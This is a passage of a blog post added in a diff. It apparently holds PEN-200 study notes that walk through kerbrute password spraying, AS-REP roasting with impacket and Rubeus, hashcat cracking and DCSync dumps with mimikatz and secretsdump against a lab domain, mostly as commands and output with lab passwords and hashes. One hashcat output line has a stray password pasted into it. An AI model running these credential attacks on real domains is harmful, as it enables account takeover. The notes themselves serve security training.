+<li>This is an excellent way to determin the level of access we have without performing additional enum.</li>
+</ul>
+<p>The third password spray attack is based on obtaining a TGT.  Example, using <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html">kinit</a> on a Linux system, we can obtain and cache a Kerberos TGT.  The advantage of this technique is that it only uses two UDP frames to determin whether the password is valid, as it sonds only an AS-REQ and examines the response.</p>
+<p>We could use Bash scripting or a programing language of our choice to automate this method, or we can use the tool <a href="https://github.com/ropnop/kerbrute">kerbrute</a> which implements this technique to spray passwords.  This tool is cross platform and can be used on both Linux and Windows.</p>
+<p>Let&#39;s use the Win version in <code>C:\Tools</code> to perform this attack.  To conduct the attack we need to specify the <code>passwordspray</code> command along with a list of usernames and the password to spray.  We&#39;ll also need to enter the domain <code>corp.com</code> as arg for <code>-d</code>.  Create a file <code>usernames.txt</code> in <code>C:\Tools</code> containing user names <code>pete</code>, <code>dave</code>, <code>jen</code>.</p>
+<pre><code class="language-powershell">PS C:\Tools&gt; .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt &quot;Nexus123!&quot;
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 12/15/23 - Ronnie Flathers @ropnop
+
+2023/12/15 07:21:47 &gt;  Using KDC(s):
+2023/12/15 07:21:47 &gt;   dc1.corp.com:88
+2023/12/15 07:21:47 &gt;  [+] VALID LOGIN:  jen@corp.com:Nexus123!
+2023/12/15 07:21:47 &gt;  [+] VALID LOGIN:  pete@corp.com:Nexus123!
+2023/12/15 07:21:47 &gt;  Done! Tested 3 logins (2 successes) in 0.028 seconds
+</code></pre>
+<p><em>If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad&#39;s Save As functionality to change the encoding.</em></p>
+<p>For crackmap and kerbrute, we had to provide a list of usernames.  To obtain a list of all domain users, we can leverage techniques we learned in Active Directory Introduction and Enumeration or use the built-in user enumeration functions of both tools.</p>
+<h5>AS-REP Roasting</h5>
+<p>As we learned, the first step in the Kerberos auth process is to send an AS-REQ.  the DC can validate if the auth succeeds, if so the DC replies with a AS-REP containing the session key and TGT.  This step is also know as <a href="https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx">Kerberos Preauthentication</a> which prevents offline password guessing.</p>
+<p>Without Kerberos preauthentication, an attacker could send an AS-REQ to the DC on behalf of an AD user.  Once the AS-REP has been obtained from the DC, the attacker could execute an offline password attack against the encrypted part of the response.  This is known as <a href="https://harmj0y.medium.com/roasting-as-reps-e6179a65216b">AS-REP Roasting</a>.</p>
+<p>By default, the AD user account option <em>Do not require Kerberos preauthentication</em> is disabled, meaning Kerberos preauthentication is performed by all users.  However, it&#39;s possible to enable this account option manually.  During an assesment, we may find accounts with this option enabled as some apps and technologies require it to function properly.</p>
+<p>Let&#39;s perform this attack from our Kali machine first, then from Win.  On Kali, we can utilize <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">impacket-GetNPUsers</a> to perform AS-REP roasting.  We&#39;ll need to enter the IP address of the DC for arg <code>-dc-ip</code>, the name of the output file in which the AS-REP hash will be stored in the Hashcat format for <code>-outputfile</code>, and <code>-request</code> to request the TGT.</p>
+<p>Then we need to specify the target auth info in the format <code>domain/user</code>.  This is the user we use for authentication.  For example, we&#39;ll use <code>pete</code> with password <code>Nexus123!</code> from the prior section.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec]
+└─$ impacket-GetNPUsers -dc-ip 192.168.242.70  -request -outputfile hashes.asreproast corp.com/pete     
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
+----  ----------------------------------------  --------------------------  --------------------------  --------
+dave  CN=Development Department,DC=corp,DC=com  2022-09-07 09:54:57.521205  2023-11-13 05:42:28.351559  0x410200 
+
+
+
+$krb5asrep$23$dave@CORP.COM:84034d5b9fde766369bd77ebad4da7c3$55b32180de371d7a182a5c3a5f6738181fdbfdfad215168234c1253efb1c1663d194a25df0a849767c7fe91dee8035def92e4af99b10218dcd12a4e7f065d1045be082fe62d05786567cdf95495dc3ffe0fcc443abeef2906edb0ffc00cac751afd6c70f5a24adc47f11eda98d78c81c38318c2140a710e91813a858ff2c517302a939631286bd15bab95eeb48d2586958e77006ba15e8ca65555dcb8c36c4177b7317d1fc33195afaaba1b97090f9a5fb8a262e4794a11b55222e1636fcf652e78d334b761e776d34f79c9737674a22953f08de7869a314544b2c3c2d64a512fcbf3ce5
+</code></pre>
+<ul>
+<li>Shows that <code>dave</code> has the user account option <em>Do not require kerberos preauthentication</em> enabled.</li>
+<li>It is vulnerable to AS-REP Roasting.</li>
+</ul>
+<p>The default hash format of <code>impacket-GetNPUsers</code> is compatible with Hashcat, so we must check the mode for AS-REP hash by grepping for &quot;Kerberos&quot; in the Hashcat help.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/AD]
+└─$ hashcat --help | grep -i &quot;Kerberos&quot;                           
+  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
+  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
+  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
+  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
+  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
+  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
+   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network ProtocolHenchmanPutridBonbon11
+  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
+  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
+</code></pre>
+<ul>
+<li>The output shows the correct mode for AS-REP is <code>18200</code></li>
+</ul>
+<p>We now have what we need to launch Hashcat and crack the AS-REP hash.  Run Hashcat with:</p>
+<ul>
+<li>Mode <code>18200</code></li>
+<li>AS-REP hash file.</li>
+<li>Wordlist <code>rockyou.txt</code></li>
+<li>Rule file <code>best64.rule</code></li>
+<li><code>--force</code></li>
+</ul>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/AD]
+└─$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+[sudo] password for operator: 
+...
+
+$krb5asrep$23$dave@CORP.COM:84034d5b9fde766369bd77ebad4da7c3$55b32180de371d7a182a5c3a5f6738181fdbfdfad215168234c1253efb1c1663d194a25df0a849767c7fe91dee8035def92e4af99b10218dcd12a4e7f065d1045be082fe62d05786567cdf95495dc3ffe0fcc443abeef2906edb0ffc00cac751afd6c70f5a24adc47f11eda98d78c81c38318c2140a710e91813a858ff2c517302a939631286bd15bab95eeb48d2586958e77006ba15e8ca65555dcb8c36c4177b7317d1fc33195afaaba1b97090f9a5fb8a262e4794a11b55222e1636fcf652e78d334b761e776d34f79c9737674a22953f08de7869a314544b2c3c2d64a512fcbf3ce5:Flowers1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$dave@CORP.COM:84034d5b9fde766369bd77e...bf3ce5
+Time.Started.....: Sat Dec 16 11:22:26 2023, (0 secs)
+Time.Estimated...: Sat Dec 16 11:22:26 2023, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1451.3 kH/s (6.54ms) @ Accel:64 Loops:38 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 256000/1104517645 (0.02%)
+Rejected.........: 0/256000 (0.00%)
+Restore.Point....: 3072/14344385 (0.02%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-38 Iteration:0-38
+Candidate.Engine.: Device Generator
+Candidates.#1....: adriano -&gt; fr123
+Hardware.Mon.#1..: Temp: 50c Util: 16%
+
+Started: Sat Dec 16 11:21:54 2023
+Stopped: Sat Dec 16 11:22:27 2023
+</code></pre>
+<ul>
+<li>Hashcat succeeds with password <code>Flowers1</code> for user <code>dave</code></li>
+</ul>
+<p>We can also perform AS-REP Roasting on Windows.  We&#39;ll use <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>, a toolset for raw Kerberos interactions and abuses.  To perform the attack we connect to CLIENT75 via RDP as domain user <code>jeff</code> with password <code>HenchmanPutridBonbon11</code>.</p>
+<p>Since we are performing the attack as a preauthenticated domain user, we need no other options except <code>asreproast</code>.  Rubeus will auto ID vulnerable user accounts.  Add the flag <code>/nowrap</code> to prevent new lines being added to the resulting AS-REP hashes.</p>
+<pre><code class="language-powershell">PS C:\Tools&gt; .\Rubeus.exe asreproast /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2
+
+
+[*] Action: AS-REP roasting
+
+[*] Target Domain          : corp.com
+
+[*] Searching path &#39;LDAP://DC1.corp.com/DC=corp,DC=com&#39; for &#39;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&#39;
+[*] SamAccountName         : dave
+[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
+[*] Using domain controller: DC1.corp.com (192.168.242.70)
+[*] Building AS-REQ (w/o preauth) for: &#39;corp.com\dave&#39;
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$dave@corp.com:F3A56FE7D159384A8512C68CF8523759$9BCA3A38F6CFD6923909D403C65676F3AA53247046C198445705496921E972DBDFCD6C20836F9683283B532FE583E4F7B42B820E1CB4B90F35A17FE31CEE18C9FCB5C7D601BD09F6631FEE2634CEA6209FAB612F68C32B519A059D3B321DEC6A51D35CFA4D3C4271CB67DFF5C167838904846FB759824C77F6BDECB36771E0A06C5721BFDA8D9FDBBD18BEF37A7B9B05AB52C0A5F138584D9F59AA437505A761F8FA1A075B01389A560ADF6935852FD5C95456D975DA22D3616519D1F567B4C5EF08CFD61083A4303F7982F84120F3881EECBBD74D2F5E0E91BE0E2B2DAF2EAFE3CADBAD
+</code></pre>
+<ul>
+<li>Rubeus identified <code>dave</code> as vulnerable to AS-REP Roasting and displays the AS-REP hash.</li>
+</ul>
+<p>We can copy the hash and paste it into a text file <code>hashes.asreproast2</code> in the working dir of <code>kali</code> and run Hashcat again.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/AD]
+└─$ sudo hashcat -m 18200 hashes.asreproast2 
+...
+
+$krb5asrep$dave@corp.com:f3a56fe7d159384a8512c68cf8523759$9bca3a38f6cfd6923909d403c65676f3aa53247046c198445705496921e972dbdfcd6c20836f9683283b532fe583e4f7b42b820e1cb4b90f35a17fe31cee18c9fcb5c7d601bd09f6631fee2634cea6209fab612f68c32b519a059d3b321dec6a51d35cfa4d3c4271cb67dff5c167838904846fb759824c77f6bdecb36771e0a06c5721bfda8d9fdbbd18bef37a7b9b05ab52c0a5f138584d9f59aa437505a761f8fa1a075b01389a560adf6935852fd5c95456d975da22d3616519d1f567b4c5ef08cfd61083a4303f7982f84120f3881eecbbd74d2f5e0e91be0e2b2daf2eafe3cadbad:Flowers1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$dave@corp.com:f3a56fe7d159384a8512c68cf8...cadbad
+Time.Started.....: Sat Dec 16 11:54:04 2023, (0 secs)
+Time.Estimated...: Sat Dec 16 11:54:04 2023, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  2731.3 kH/s (4.76ms) @ Accel:64 Loops:38 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 256000/1104517645 (0.02%)
+Rejected.........: 0/256000 (0.00%)
+Restore.Point....: 3072/14344385 (0.02%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-38 Iteration:0-38
+Candidate.Engine.: Device Generator
+Candidates.#1....: adriano -&gt; fr123
+Hardware.Mon.#1..: Temp: 42c Util: 30%
+
+Started: Sat Dec 16 11:54:03 2023
+Stopped: Sat Dec 16 11:54:06 2023
+</code></pre>
+<ul>
+<li>Hashcat succeeds in cracking the AS-REP.</li>
+</ul>
+<p>To identify users with <em>Do not require Kerberos preauthentication</em> option enabled in AD we can use PowerView&#39;s <code>Get-DomainUser</code> function with <code>-PreauthNotRequired</code> option on Win.  On kali, we could use <code>impacket-GetNPUsers</code> without the <code>-request</code> and <code>-outputfile</code> options.</p>
+<p>Assume we are conducting an assessment where we cannot ID and users with the <em>Do not require Kerberos preauthentication</em> option enabled.  During enum, we notice that we have <code>GenericWrite</code> or <code>GenericAll</code>perms on another AD user account.  Using these perms we could reset their passwords, but it would lock the user out of the account.  We could also leverage these perms to modify the UAC calue of the user to not require Kerberos preauthentication, an attack known as <em>Targeted AS-REP Roasting</em>.  Note that we should reset the UAC value of the user once we&#39;ve obtained the hash.</p>
+<h5>Domain Controller Synchronization</h5>
+<p>In prod env, domains typically employ multiple domain controllers for redundancy.  <a href="https://msdn.microsoft.com/en-us/library/cc228086.aspx">The Directory Replication Service (DRS) Remote Protocol</a> uses <a href="https://technet.microsoft.com/en-us/library/cc772726(v=ws.10).aspx">replication</a> to syncronize redundant DCs.  A DC can request an update for a specific object, an account for example, using <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894">IDL_DRSGetNCChanges</a> API.</p>
+<p>Conveniently, the DC that recieves the request to update does not check if the request came from a known DC, it only verifies that the associated SID has appropriate privs.  If we issue a rogue update request to a DC from a user with proper rights, it will succeed.</p>
+<p>To start a replication, a user needs to have rights:</p>
+<ul>
+<li>Replicating Directory Changes.</li>
+<li>Replicating Directory Changes All.</li>
+<li>Replicating Directory Changes in Filtered Set.
+<em>Members of Domain Admins, Enterprise Admins, and Administrators groups have them by default.</em></li>
+</ul>
+<p>If we obtain access to a user account in a group with these rights, we can perform a <a href="https://adsecurity.org/?p=2398#MimikatzDCSync">dcsync</a> attack by impersonating a DC, allowing us to request any user creds from the domain.</p>
+<p>To perform this attack, we use Mimikatz on a domain joined machine or <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">impacket-secretsdump</a> on a non-domain joined Kali system.</p>
+<p>We&#39;ll start with Mimikatz and connect to CLIENT75 as <code>jeffadmin</code> with the password <code>BrouhahaTungPerorateBroom2023!</code>, as a member of the Domain Admins group we already have to required rights.</p>
+<p>To perform the attack with Mimikatz, we use <code>lsadump:dcsync</code> module and provide the domain username for which we want to obtain creds as the <code>/user:</code> arg.</p>
+<pre><code class="language-powershell">PS C:\Tools&gt; .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
+ .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # lsadump::dcsync /user:corp\dave
+[DC] &#39;corp.com&#39; will be the domain
+[DC] &#39;DC1.corp.com&#39; will be the DC server
+[DC] &#39;corp\dave&#39; will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : dave
+
+** SAM ACCOUNT **
+
+SAM Username         : dave
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
+Account expiration   :
+Password last change : 9/7/2022 8:54:57 AM
+Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
+Object Relative ID   : 1103
+
+Credentials:
+  Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
+    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
+    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
+    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
+    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : effb924cd89d434ffdc0689ccbdb54f3
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : CORP.COMdave
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
+      aes128_hmac       (4096) : f94890e59afc170fd34cfbd7456d122b
+      des_cbc_md5       (4096) : 1a329b4338bfa215
+    OldCredentials
+      aes256_hmac       (4096) : 71d25b1b120bfb0399bc172f9d880fef1b4334508e0c17f8d37696fdea166d3a
+      aes128_hmac       (4096) : 6f8ada9f58eb15022feabb7c2f8666ec
+      des_cbc_md5       (4096) : 1ad389f2e334fdc7
+
+* Primary:Kerberos *
+    Default Salt : CORP.COMdave
+    Credentials
+      des_cbc_md5       : 1a329b4338bfa215
+    OldCredentials
+      des_cbc_md5       : 1ad389f2e334fdc7
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  bf3f8646194af931625bc6d0703f3140
+    02  2f4f8fde5f6416ffd9026410b7ef12cc
+    03  a8e909e92b558d0667daf4726e0d545f
+    04  bf3f8646194af931625bc6d0703f3140
+    05  2f4f8fde5f6416ffd9026410b7ef12cc
+    06  c02f38536999df4b410ef3f006dcb97a
+    07  bf3f8646194af931625bc6d0703f3140
+    08  18ed1c118eaef802fea957308c933a28
+    09  18ed1c118eaef802fea957308c933a28
+    10  db108ed982e9d6d4e967bbbc6f6df818
+    11  893c5df0780789c0cf9ab0d81c35ce1c
+    12  18ed1c118eaef802fea957308c933a28
+    13  4b51168b8495e9e394eca67007a01754
+    14  893c5df0780789c0cf9ab0d81c35ce1c
+    15  6b9e1549b7989a84e6f8b847faa5b586
+    16  6b9e1549b7989a84e6f8b847faa5b586
+    17  ac577428443eacc580eb1fc96a0f913b
+    18  88a02648341614ca1b17328be55f6080
+    19  c43266b4dae9ea1f7aaca88380f0856e
+    20  f52455d19bb8fd879814db1daf06a9e4
+    21  3dee5b4a6cad1018ef52c2c289793a9e
+    22  3dee5b4a6cad1018ef52c2c289793a9e
+    23  74f40b3f62a91b7864c394c866d041f5
+    24  aabd382aa86b73f1faec883bbffbb851
+    25  aabd382aa86b73f1faec883bbffbb851
+    26  f357ae2fb05ff3151a20959bf82a5bf6
+    27  4297a9082d57fbdab3d10ef53a33455a
+    28  4dc7a5887b16aadd37ef1ecc138a4346
+    29  1039fd82b8826a73352cf31a26aba0cb
+</code></pre>
+<ul>
+<li>Mimikatz dcsync attack succeeds <code>Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494</code></li>
+</ul>
+<p>Copy the NTLM hash into a file names <code>hashes.dcsync</code> on our Kali sys, we can crack using Hashcat.</p>
+<ul>
+<li>Mode <code>1000</code></li>
+<li>Wordlist <code>rockyou.txt</code></li>
+<li>Rule file <code>best64.rule</code></li>
+<li>Path to hash file and <code>--force</code></li>
+</ul>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/AD]
+└─$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+...
+
+08d7a47a6f9f66b97b1bae4178747494:Flowers1
+</code></pre>
+<ul>
+<li>We retrieve the plaintext password of <code>dave</code></li>
+</ul>
+<p>We can now retrieve the NTLM hash of any domain user account on the corp.com domain, we can then attempt to crack the hashes and retrieve plaintext passwords of the accounts.</p>
+<p>We can perform the desync attack to obtain any user password hash in the domain, event the domain admin.</p>
+<pre><code class="language-bash">mimikatz # lsadump::dcsync /user:corp\dave
+[DC] &#39;corp.com&#39; will be the domain
+[DC] &#39;DC1.corp.com&#39; will be the DC server
+[DC] &#39;corp\dave&#39; will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : dave
+
+** SAM ACCOUNT **
+
+SAM Username         : dave
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
+Account expiration   :
+Password last change : 9/7/2022 8:54:57 AM
+Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
+Object Relative ID   : 1103
+
+Credentials:
+  Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
+...
+</code></pre>
+<p>In upcoming module Lateral Movement in Active Directory we will discuss lateral movement vectors leveraging NTLM hashes obtained by dcsync.</p>
+<p>Next, let&#39;s perform a dcsync attack from Kali, using <code>imapcket-secretsdump</code>.  Enter target username <code>dave</code> as an arg for <code>-just-dc-user</code> and provide the creds of a user with required rights, along with a DC IP in the format <code>domain/user:password@ip</code>.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/AD]
+└─$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:&quot;BrouhahaTungPerorateBroom2023\!&quot;@192.168.199.70
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
+[*] Kerberos keys grabbed
+dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
+dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
+dave:des-cbc-md5:1a329b4338bfa215
+[*] Cleaning up...
+</code></pre>
+<ul>
+<li>We obtained the NTLM hash using <a href="https://wiki.samba.org/index.php/DRSUAPI">DRSUAPI</a></li>
+<li>The MS API which implements Directory Replication Service Remote Protocol.</li>
+</ul>
+<p>The dcsync attack allows us to obtain the cred of any user, from Win or Linux, by impersonating the DC and abusing replication.  We do need a user in the groups:</p>
+<ul>
+<li>Domain Admins.</li>
+<li>Enterprise Admins.</li>
+<li>Administrators.
+it is possible to leverage a user with proper rights, but it is unlikely that we will encounter this in the wild.</li>
+</ul>
+
+  </div>
+
+  
+    <footer class="blog-author-card">
+      
+        <img class="blog-author-avatar" src="assets/static/img/bunny-punx.webp" alt="m4xx3d0ut avatar">
+      
+      <div class="blog-author-details">
+        <strong class="blog-author-name">m4xx3d0ut</strong>
+        
+          <div class="blog-author-title">Chaos Operator</div>
+        
+        
+          <p class="blog-author-bio">Architect of the Neon Terminal Core and Professional Technologist.</p>
+        
+        
+          <ul class="blog-author-social">
+            
+              <li><a href="https://www.linkedin.com/in/paul-k-a3a18196/" target="_blank" rel="noopener">@m4xx3d0ut</a></li>
+            
+          </ul>
+        
+      </div>
+    </footer>
+  
+
+  
+    <nav class="blog-article-nav" aria-label="Post navigation">
+      <a
+        class="blog-article-nav-link"
+        data-blog-nav="previous"
+        
+        href="blog/ad-lateral-movement.html"
+        data-default-href="blog/ad-lateral-movement.html"
+        data-default-fragment="blog/fragments/ad-lateral-movement.html"
+        data-fragment-href="blog/fragments/ad-lateral-movement.html"
+        data-target-slug="ad-lateral-movement"
+        data-post-slug="ad-lateral-movement"
+      >
+        <span class="blog-article-nav-meta">Previous</span>
+        <span class="blog-article-nav-title">PEN-200 Module 23 — Lateral Movement and Persistence in AD</span>
+      </a>
+      <span class="blog-article-nav-delimiter" aria-hidden="true">&nbsp;•&nbsp;</span>
+      <a
+        class="blog-article-nav-link"
+        data-blog-nav="next"
+        
+        href="blog/local-ssl-certificate.html"
+        data-default-href="blog/local-ssl-certificate.html"
+        data-default-fragment="blog/fragments/local-ssl-certificate.html"
+        data-fragment-href="blog/fragments/local-ssl-certificate.html"
+        data-target-slug="local-ssl-certificate"
+        data-post-slug="local-ssl-certificate"
+      >
+        <span class="blog-article-nav-meta">Next</span>
+        <span class="blog-article-nav-title">Local SSL Certificate</span>
+      </a>
+    </nav>
+  
+</article>
+
